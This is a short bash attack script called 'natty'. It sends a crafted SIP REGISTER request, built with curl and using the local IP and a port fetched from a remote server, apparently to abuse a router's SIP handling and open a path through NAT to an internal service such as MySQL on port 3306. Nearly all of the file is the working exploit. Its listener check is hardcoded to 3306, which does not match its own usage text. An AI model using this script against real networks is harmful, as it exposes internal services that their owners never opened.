#!/bin/bash

if [ $# -gt 4 ] || [ $# -eq 0 ]; then
  echo "Usage: ./natty SIP_SERVER SIP_PORT WEB_PORT [LOCAL_IP]"
  echo "       ./natty 10.10.10.10 5060 8080"
  echo "NATTY will attempt to figure out local IP, but that can be overwritten with last argument"
  exit 1
fi

REMOTE_IP=$1
RPORT=${2:-5060}
WEB_PORT=$3
PWN_PORT=$(curl -s "http://$REMOTE_IP:$WEB_PORT/")
LOCAL_IP=${4:-$(ip route get 1 | awk '{print $NF;exit}')}

if ! netstat -lnt | grep -c ':3306'; then
  echo "Not listening on requested port, exiting..."
  exit 2
fi

echo "Welcome"
echo "Remote: " $REMOTE_IP:$RPORT
echo "Local:  " $LOCAL_IP:$PWN_PORT
echo "Sending"
echo ""

curl -i -s -k -X $'REGISTER' \
-H $'Via: SIP/2.0/TCP '$LOCAL_IP:$RPORT';branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP' \
-H $'Max-Forwards: 70' -H $'Contact: <sip:wuzzi@'$LOCAL_IP:$WEB_PORT';rinstance=v40f3f83b335139c;transport=TCP>' \
-H $'To: <sip:wuzzi@example.org;transport=TCP>' \
-H $'From: <sip:wuzzi@example.org;transport=TCP>;tag=U7c3d519' \
-H $'Call-ID: aaaaaaaaaaaaaaaaa0404aaaaaaaaaaaabbbbbbZjQ4M2M.' \
-H $'CSeq: 1 REGISTER' -H $'Expires: 60' -H $'Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE' \
-H $'Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri' \
-H $'Allow-Events: presence, kpml' -H $'Content-Length: 0' \
$'http://'$REMOTE_IP:$RPORT'/sip:example.org;transport=TCP'

echo ""
echo "Done."
